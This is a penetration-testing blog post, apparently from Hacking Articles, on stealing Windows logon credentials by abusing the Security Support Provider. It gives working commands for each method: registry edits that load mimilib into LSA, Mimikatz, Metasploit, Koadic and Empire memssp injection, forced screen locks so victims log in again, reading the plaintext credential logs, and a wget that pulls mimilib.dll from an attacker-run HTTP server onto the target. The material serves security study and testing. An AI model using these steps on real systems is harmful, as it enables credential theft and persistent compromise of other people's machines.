<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/credential-dumping/" rel="category tag">Credential Dumping</a>, <a href="https://www.hackingarticles.in/category/red-teaming/domain-credential/" rel="category tag">Domain Credential</a></span>            </div>
            <h1 class="post-title entry-title">Credential Dumping: Security Support Provider (SSP)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/credential-dumping-security-support-provider-ssp/" rel="bookmark"><time class="entry-date published" datetime="2020-04-08T10:38:57+00:00">April 8, 2020</time><time class="updated" datetime="2025-07-22T21:27:25+00:00">July 22, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we will dump the windows login credentials by exploiting SSP. This is our fourth article in the series of credential dumping. Both local and remote method is used in this article to cover every aspect of pentesting.</span></p>
<h3><span style="color: #800000;">Table of contents</span></h3>
<ul>
<li><span style="color: #000000;">Introduction to Security Support Provider (SSP)</span></li>
<li><span style="color: #000000;">Manual</span></li>
<li><span style="color: #000000;">Mimikatz</span></li>
<li><span style="color: #000000;">Metasploit Framework</span></li>
<li><span style="color: #000000;">Koadic</span></li>
<li><span style="color: #000000;">Powershell Empire</span></li>
</ul>
<h3><span style="color: #800000;">Introduction to Security Support Provider</span></h3>
<p><span style="color: #000000;">Windows uses the <strong data-start="99" data-end="134">Security Support Provider (SSP)</strong> API to handle Windows login authentications. Additionally, this <strong data-start="199" data-end="206">DLL</strong> file provides security packages to other applications. It stacks itself into the <strong data-start="288" data-end="295">LSA</strong> when the system starts, making it part of the startup process. Once it loads into <strong data-start="378" data-end="385">LSA</strong>, it gains access to all of the Windows credentials. Moreover, you can find the configurations for this file in two different registry keys at the following locations:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</pre>
<h3><span style="color: #800000;">Manual</span></h3>
<p><span style="color: #000000;">The first method we will use to exploit <strong data-start="627" data-end="634">SSP</strong> is manual. Once you successfully execute this method and the system reboots, it will dump the credentials for you. These credentials will be saved in a file created upon user login with the name <strong data-start="830" data-end="841">kiwissp</strong>. You can find this file in the registry at <strong data-start="885" data-end="930">HKLM\System\CurrentControlSet\Control\LSA</strong>.</span></p>
<p><span style="color: #000000;">The first step in this method is to copy the mimilib.dll file from mimikatz folder to the system32 folder. This file is responsible for creating kiwissp file which stores credentials in plaintext for us.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sPlzUQuv3po/Xo2mDnQUh0I/AAAAAAAAjak/yvatwAPMy8cQIH6wyBcHx8b8ZtFDAWPQACLcBGAsYHQ/s1600/0.png"/></span></p>
<p><span style="color: #000000;">Then navigate yourself to <strong>hklm\system\currentcontrolset\control\lsa. </strong>And here you can find that there is no entry in <strong>Security Packages</strong> as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YioqHFAq6rQ/Xo2mDg3YXLI/AAAAAAAAjac/9BPPBDN7hAMdaASy5OrV6fPb7Xixk5AIQCLcBGAsYHQ/s1600/1.png"/></span></p>
<p><span style="color: #000000;">The same can be checked with the following PowerShell command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"</pre>
<p><span style="color: #000000;">Just as shown in the image below, there is no entry. So, this needs to be changed if want to dump the credentials. We need to add all the services that helps SSP to manage credentials; such as Kerberos, wdigest etc. Therefore we will use the following command to make these entries:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ /f</pre>
<p><span style="color: #000000;">And then to confirm whether the entry has been done or not, use the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wrzepMk1yRE/Xo2mEi0e2jI/AAAAAAAAjaw/QKlaTY2ClA8DKJrupA2vYnB5CscQZSDCACLcBGAsYHQ/s1600/2.png"/></span></p>
<p><span style="color: #000000;">You can then again navigate yourself to <strong>hklm\system\currentcontrolset\control\lsa </strong> to the enteries that you just made.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ilRrQ5AqBn0/Xo2mFG5TcgI/AAAAAAAAja0/YgqfZeOucRMo2CGFB3IOGqk3fBvxxPd3gCLcBGAsYHQ/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Now, whenever the user reboots their PC, a file with the name of kiwissp.log will be created in system32. Then this file will have your credentials stored in cleartext. Use the following command to read the credentials:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">type C:\Windows\System32\kiwissp.log</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5p3iMMRkBKs/Xo2mFSSVIWI/AAAAAAAAja4/vdxmx3Sv-18CH4mevlZxBr6xZPyAwickwCLcBGAsYHQ/s1600/4.png"/></span></p>
<h3><span style="color: #800000;">Mimikatz</span></h3>
<p><span style="color: #000000;"><strong data-start="556" data-end="568">Mimikatz</strong> includes a module that injects itself into memory. When a user signs out of Windows and then signs back in, this module retrieves their passwords from memory. To use this method, simply load <strong data-start="760" data-end="772">Mimikatz</strong> and type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">privilege::debug
misc::memssp</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Q0D73o9NPpc/Xo2mFevmhvI/AAAAAAAAja8/D6hZz0-C96EvRxuQtFnZvRJlQ50OMcBUACLcBGAsYHQ/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Running the above commands will create mimilsa.log file in system32 upon logging in by the user. To read this file use the following command;</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">type C:\Windows\System32\mimilsa.log</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-J382RFoiSHw/Xo2mGN8l-vI/AAAAAAAAjbA/EM7rBIWkg3AJwOiGroSQ2VZYMZ-4mL-jQCLcBGAsYHQ/s1600/6.png"/></span></p>
<h3><span style="color: #800000;">Metasploit Framework</span></h3>
<p><span style="color: #000000;">When dumping credentials remotely, Metasploit really comes handy. The ability of Metasploit providing us with kiwi extension allows us to dump credentials by manipulating SSP just like our previous method. Now when you have meterpreter session through Metasploit use <strong>load kiwi</strong> command to initiate kiwi extension. And then to inject the mimikatz module in memory use the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">kiwi_cmd misc::memssp</pre>
<p><span style="color: #000000;">Now the module has been successfully injected in the memory. As this module creates the file with clear text credential when the user logs in after the memory injection; we will force the lock screen on the victim so that after login we can have our credentials. For this run the following commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell
RunDll32.exe user32.dll,LockWorkStation</pre>
<p><span style="color: #000000;">Now we have forced the user to logout the system. Whenever the user will log in our mimilsa file will be created in the system32 and to read the file use the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">type C:\Windows\System32\mimilsa.log</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JiHky1oNFCQ/Xo2mDtCsJ5I/AAAAAAAAjag/le2V0fXceI8qtr3xDwfSnZ3rQX325aITwCLcBGAsYHQ/s1600/13.png"/></span></p>
<h3><span style="color: #800000;"><span class="text-gray-dark mr-2">Koadic</span></span></h3>
<p><span style="color: #000000;">Just like Metasploit, <span class="text-gray-dark mr-2">Koadic</span> too provides us with similar mimikatz module; so, let’s get to dumping the credentials.</span></p>
<p><span style="color: #000000;">Once you have a session with <span class="text-gray-dark mr-2">Koadic</span>, use the following exploit to inject the payload in the memory:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use mimikatz_dynwrapx
set MIMICMD misc::memssp
execute</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5Vz0SXsm3jA/Xo2mEW1XmwI/AAAAAAAAjao/JwHPSIYlf3ED2I44hRIWGvIC0tvv6ol2ACLcBGAsYHQ/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Once the above exploit has successfully executed itself, use the following commands to force the user to sign out of the windows and then run the dll command to read the mimilsa file:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cmdshell 0
RunDll32.exe user32.dll,LockWorkStation
type mimilsa.log</pre>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-2vZ25RRFZ84/Xo2mEtXlF-I/AAAAAAAAjas/ZTeU_avHpfsy4dEjoIvzjaZ2sDQimRD1ACLcBGAsYHQ/s1600/15.png" alt="Credential Dumping via Security Support Provider (SSP)" width="813" height="208"/></span></p>
<p><span style="color: #000000;">As shown in the above image, you will have your credentials.</span></p>
<h3><span style="color: #800000;">PowerShell Empire</span></h3>
<p><span style="color: #000000;">Empire is an outstanding tool, we have covered the PowerShell empire in a series of article, to read the article click <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/multiple-ways-to-exploiting-windows-pc-using-powershell-empire/">here</a></strong></span>. With the help of mimikatz, empire allows us to inject the payload in the memory which further allows us to retrieve windows logon credentials. Once to have a session through the empire, use the following post exploit to get your hands on the credentials:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usemodule persistence/misc/memssp
execute</pre>
<p><span style="color: #000000;">After you successfully execute the exploit, the final step is to lock the user out of their system. This approach ensures that when the user signs back in, you can capture the file that saves credentials in plaintext. To lock the user out, use the following exploit:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usemodule management/lock
execute</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-RnKdjl2iSuM/Xo7ouk5PbrI/AAAAAAAAjdI/tn9UOKtn__47t_XK-vbse_eMLpe_VPiWgCLcBGAsYHQ/s1600/17.png"/></p>
<p><span style="color: #000000;">After the user logs in, the said file will be created. To read the contents of the file use the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">type C:\Windows\System32\mimilsa.log</pre>
<p><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-TFRpufYKImA/Xo7ouX7BPPI/AAAAAAAAjdA/umc0Ev5B72QozeN0WE6Pz52Wrnklxol_gCLcBGAsYHQ/s1600/18.png" alt="Credential Dumping via Security Support Provider (SSP)" width="535" height="208"/></p>
<h3><span style="color: #800000;">Powershell Empire: mimilib.dll</span></h3>
<p><span style="color: #000000;">In the manual method, everything that we did can also be done remotely through empire which is useful in external penetration testing. The first step in this method is to send the mimilib.dll file from mimikatz folder to the system32 folder in the target system. To do so, simply go to the mimikatz folder where the mimilib.dll file is located and initiate the python server as shown in the following image:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-ZMEN8Ct0QKk/Xo7ouf_pHiI/AAAAAAAAjdE/1A-oKWg38ekyku2G0rNuzfYNPYCZKWuVQCLcBGAsYHQ/s1600/20.png"/></p>
<p><span style="color: #000000;">After that, through your session, run the following set shell commands to do the deed:</span></p>
<p><strong> <img decoding="async" src="https://1.bp.blogspot.com/-KSEOsr19su8/Xo7ovHVVRCI/AAAAAAAAjdM/IgV5FFepg4YVtAqMwm_nUou9kbCJ8fKZwCLcBGAsYHQ/s1600/22.png"/></strong></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell wget http://192.168.1.112:8000/mimilib.dll -outfile mimilib.dll
reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
shell reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ /f</pre>
<p>From the above set of commands, the first command will download mimilib.dll from your previously made python server into the target PC and the rest of the two commands will edit the registry key value for you. As the commands have executed successfully, all now you have to do is wait for the target system to restart. And once that happens your file will be created. To access the file, <span style="color: #000000;">use the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell type kiwissp.log</pre>
<p><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-TUOoBoiAQzE/Xo7ovbYx6II/AAAAAAAAjdQ/qOxXkDGGqbwr_LwuhwUghQBA5F2rBcRmACLcBGAsYHQ/s1600/23.png" alt="Credential Dumping via Security Support Provider (SSP)" width="671" height="273"/></p>
<p>And we have our credentials. Yay!</p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <span style="color: #0000ff;"><strong><a class="broken_link" style="color: #0000ff;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
